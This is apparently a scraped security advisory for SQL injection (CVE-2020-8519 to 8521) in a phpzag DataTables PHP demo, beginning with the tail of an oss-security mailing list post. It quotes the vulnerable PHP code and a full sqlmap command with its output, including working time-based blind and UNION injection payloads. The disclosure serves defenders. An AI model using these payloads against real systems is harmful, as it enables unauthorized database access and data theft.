    Payload: draw=153&columns[0][data]=0&columns[0][name]=&columns[0][searchable]=true&columns[0][orderable]=false&columns[0][search][value]=&columns[0][search][regex]=false&columns[1][data]=1&columns[1][name]=&columns[1][searchable]=true&columns[1][orderable]=true&columns[1][search][value]=&columns[1][search][regex]=false&columns[2][data]=2&columns[2][name]=&columns[2][searchable]=true&columns[2][orderable]=true&columns[2][search][value]=&columns[2][search][regex]=false&columns[3][data]=3&columns[3][name]=&columns[3][searchable]=true&columns[3][orderable]=true&columns[3][search][value]=&columns[3][search][regex]=false&columns[4][data]=4&columns[4][name]=&columns[4][searchable]=true&columns[4][orderable]=true&columns[4][search][value]=&columns[4][search][regex]=false&columns[5][data]=5&columns[5][name]=&columns[5][searchable]=true&columns[5][orderable]=true&columns[5][search][value]=&columns[5][search][regex]=false&columns[6][data]=6&columns[6][name]=&columns[6][searchable]=true&colu
 mns[6][orderable]=false&columns[6][search][value]=&columns[6][search][regex]=false&columns[7][data]=7&columns[7][name]=&columns[7][searchable]=true&columns[7][orderable]=false&columns[7][search][value]=&columns[7][search][regex]=false&order[0][column]=3&order[0][dir]=asc&start=0&length=10&search[value]= and 1") UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7162717671,0x5a6b657a455263557478797469434e4f506b596f4e5a585668496b6e7464796e6a6f6a596e656b4e,0x717a767171),NULL-- SkNj&search[regex]=false&action=listRecords
---
[10:40:02] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.vapidlabs.com_4b3c1a9e_20250119_115752.html ===


| Advisory #: 213 |
| --- |
| **Title:** SQL Injection in search field of phpzag live add edit delete data tables records with ajax php mysql |
| **Author:** Larry W. Cashdollar, @\_larry0 |
| **Date:** 2020-05-19 |
| **CVE-ID:**[[CVE-2020-8519](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8519)][[CVE- 2020-8520](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8520)][[CVE- 2020-8521](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8521)] |
| **CWE:** |
| **Download Site:** <https://www.phpzag.com/live-add-edit-delete-datatables-records-with-ajax-php-mysql/> |
| **Vendor:** PHPZAG |
| **Vendor Notified:**  2020-05-19 |
| **Vendor Contact:** |
| **Advisory:** <http://www.vapidlabs.com/advisory.php?v=213> |
| **Description:** DataTables is a jQuery JavaScript library to convert simple HTML tables to dynamic feature-rich tables. The jQuery DataTables are very user friendly to list records with live add, edit, delete records without page refresh. Due to this, DataTables used widely in web applications to list records. |
| **Vulnerability:**There is SQL injection in the search function in Records.php: CVE-2020-8519 SQL injection in search parameter: 20 if(!empty($\_POST["search"]["value"])){ 21 $sqlQuery .= 'where(id LIKE "%'.$\_POST["search"]["value"].'%" '; 22 $sqlQuery .= ' OR name LIKE "%'.$\_POST["search"]["value"].'%" '; 23 $sqlQuery .= ' OR designation LIKE "%'.$\_POST["search"]["value"].'%" '; 24 $sqlQuery .= ' OR address LIKE "%'.$\_POST["search"]["value"].'%" '; 25 $sqlQuery .= ' OR skills LIKE "%'.$\_POST["search"]["value"].'%") '; 26 } 27 CVE-2020-8520 SQL Injection in line 29 with 'order' and 'column' parameter: 28 if(!empty($\_POST["order"])){ 29 $sqlQuery .= 'ORDER BY '.$\_POST['order']['0']['column'].' '.$\_POST['order']['0']['dir'].' '; 30 } else { 31 $sqlQuery .= 'ORDER BY id DESC '; 32 } CVE-2020-8521 SQL Injection line 35 with 'start' and 'length' parameters: 34 if($\_POST["length"] != -1){ 35 $sqlQuery .= 'LIMIT ' . $\_POST['start'] . ', ' . $\_POST['length']; 36 } |
| **Export:** [JSON](export_mitre_v4.py?id=213) [TEXT](txt.php?v=213) [XML](xml.php?s=213) |
| **Exploit Code:** ```   1. $ sqlmap -u "http://192.168.0.149/live-add-edit-delete-datatables-php-mysql-demo/ajax_action.php" --data "draw=153&columns[0][data]=0&columns[0][name]=&columns[0][searchable]=true&columns[0][orderable]=false&columns[0][search][value]=&columns[0][search][regex]=false&columns[1][data]=1&columns[1][name]=&columns[1][searchable]=true&columns[1][orderable]=true&columns[1][search][value]=&columns[1][search][regex]=false&columns[2][data]=2&columns[2][name]=&columns[2][searchable]=true&columns[2][orderable]=true&columns[2][search][value]=&columns[2][search][regex]=false&columns[3][data]=3&columns[3][name]=&columns[3][searchable]=true&columns[3][orderable]=true&columns[3][search][value]=&columns[3][search][regex]=false&columns[4][data]=4&columns[4][name]=&columns[4][searchable]=true&columns[4][orderable]=true&columns[4][search][value]=&columns[4][search][regex]=false&columns[5][data]=5&columns[5][name]=&columns[5][searchable]=true&columns[5][orderable]=true&columns[5][search][value]=&columns[5][search][regex]=false&columns[6][data]=6&columns[6][name]=&columns[6][searchable]=true&columns[6][orderable]=false&columns[6][search][value]=&columns[6][search][regex]=false&columns[7][data]=7&columns[7][name]=&columns[7][searchable]=true&columns[7][orderable]=false&columns[7][search][value]=&columns[7][search][regex]=false&order[0][column]=3&order[0][dir]=asc&start=0&length=10&search[value]="+and+"1&search[regex]=false&action=listRecords" -p "search[value]" --method POST --dbms=[mysql](http://www.php.net/mysql) --level 2 --risk 2 2. ___ 3. __H__ 4. ___ ___[']_____ ___ ___  {1.1#stable} 5. |_ -| . [(]     | .'| . | 6. |___|_  [']_|_|_|__,|  _| 7. |_|V          |_|   http://sqlmap.org 9. [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program 11. [*] starting at 10:38:51 13. [10:38:52] [INFO] testing connection to the target URL 14. [10:38:52] [INFO] testing if the target URL is stable 15. [10:38:53] [INFO] target URL is stable 16. [10:38:53] [WARNING] heuristic (basic) test shows that POST parameter 'search[value]' might not be injectable 17. [10:38:53] [INFO] testing for SQL injection on POST parameter 'search[value]' 18. [10:38:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause' 19. [10:38:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Generic comment)' 20. [10:38:56] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)' 21. [10:38:56] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)' 22. [10:38:56] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' 23. [10:38:57] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace' 24. [10:38:57] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace (original value)' 25. [10:38:57] [INFO] testing 'MySQL < 5.0 boolean-based blind - Parameter replace' 26. [10:38:58] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause' 27. [10:38:58] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' 28. [10:38:59] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' 29. [10:38:59] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' 30. [10:39:00] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)' 31. [10:39:01] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)' 32. [10:39:01] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)' 33. [10:39:01] [INFO] testing 'MySQL inline queries' 34. [10:39:01] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)' 35. [10:39:01] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind' 36. [10:39:02] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' 37. [10:39:53] [INFO] POST parameter 'search[value]' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 38. for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (2) and risk (2) values? [Y/n] y 39. [10:40:00] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns' 40. [10:40:00] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found 41. [10:40:00] [INFO] target URL appears to be UNION injectable with 6 columns 42. [10:40:00] [INFO] POST parameter 'search[value]' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable 43. POST parameter 'search[value]' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y 44. sqlmap identified the following injection point(s) with a total of 203 HTTP(s) requests: 45. --- 46. Parameter: search[value] (POST) 47. Type: AND/OR time-based blind 48. Title: [MySQL](http://www.php.net/mysql) >= 5.0.12 AND time-based blind (query [SLEEP](http://www.php.net/sleep)) 49. Payload: draw=153&columns[0][data]=0&columns[0][name]=&columns[0][searchable]=true&columns[0][orderable]=false&columns[0][search][value]=&columns[0][search][regex]=false&columns[1][data]=1&columns[1][name]=&columns[1][searchable]=true&columns[1][orderable]=true&columns[1][search][value]=&columns[1][search][regex]=false&columns[2][data]=2&columns[2][name]=&columns[2][searchable]=true&columns[2][orderable]=true&columns[2][search][value]=&columns[2][search][regex]=false&columns[3][data]=3&columns[3][name]=&columns[3][searchable]=true&columns[3][orderable]=true&columns[3][search][value]=&columns[3][search][regex]=false&columns[4][data]=4&columns[4][name]=&columns[4][searchable]=true&columns[4][orderable]=true&columns[4][search][value]=&columns[4][search][regex]=false&columns[5][data]=5&columns[5][name]=&columns[5][searchable]=true&columns[5][orderable]=true&columns[5][search][value]=&columns[5][search][regex]=false&columns[6][data]=6&columns[6][name]=&columns[6][searchable]=true&columns[6][orderable]=false&columns[6][search][value]=&columns[6][search][regex]=false&columns[7][data]=7&columns[7][name]=&columns[7][searchable]=true&columns[7][orderable]=false&columns[7][search][value]=&columns[7][search][regex]=false&order[0][column]=3&order[0][[dir](http://www.php.net/dir)]=asc&start=0&length=10&search[value]= and 1") AND (SELECT * FROM (SELECT(SLEEP(5)))KGDc) AND ("Aejs"="Aejs&search[regex]=false&action=listRecords 51. Type: UNION query 52. Title: Generic UNION query (NULL) - 6 columns 53. Payload: draw=153&columns[0][data]=0&columns[0][name]=&columns[0][searchable]=true&columns[0][orderable]=false&columns[0][search][value]=&columns[0][search][regex]=false&columns[1][data]=1&columns[1][name]=&columns[1][searchable]=true&columns[1][orderable]=true&columns[1][search][value]=&columns[1][search][regex]=false&columns[2][data]=2&columns[2][name]=&columns[2][searchable]=true&columns[2][orderable]=true&columns[2][search][value]=&columns[2][search][regex]=false&columns[3][data]=3&columns[3][name]=&columns[3][searchable]=true&columns[3][orderable]=true&columns[3][search][value]=&columns[3][search][regex]=false&columns[4][data]=4&columns[4][name]=&columns[4][searchable]=true&columns[4][orderable]=true&columns[4][search][value]=&columns[4][search][regex]=false&columns[5][data]=5&columns[5][name]=&columns[5][searchable]=true&columns[5][orderable]=true&columns[5][search][value]=&columns[5][search][regex]=false&columns[6][data]=6&columns[6][name]=&columns[6][searchable]=true&columns[6][orderable]=false&columns[6][search][value]=&columns[6][search][regex]=false&columns[7][data]=7&columns[7][name]=&columns[7][searchable]=true&columns[7][orderable]=false&columns[7][search][value]=&columns[7][search][regex]=false&order[0][column]=3&order[0][[dir](http://www.php.net/dir)]=asc&start=0&length=10&search[value]= and 1") UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7162717671,0x5a6b657a455263557478797469434e4f506b596f4e5a585668496b6e7464796e6a6f6a596e656b4e,0x717a767171),NULL-- SkNj&search[regex]=false&action=listRecords 54. --- 55. [10:40:02] [INFO] the back-end DBMS is MySQL 56. web server operating system: Linux Ubuntu 57. web application technology: Apache 2.4.29 58. back-end DBMS: MySQL >= 5.0.12 59. [10:40:02] [WARNING] HTTP error codes detected during run: 60. 500 (Internal Server Error) - 31 times 61. [10:40:02] [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/192.168.0.149'  ``` |
| **Screen Shots:** |
| **Notes:** |


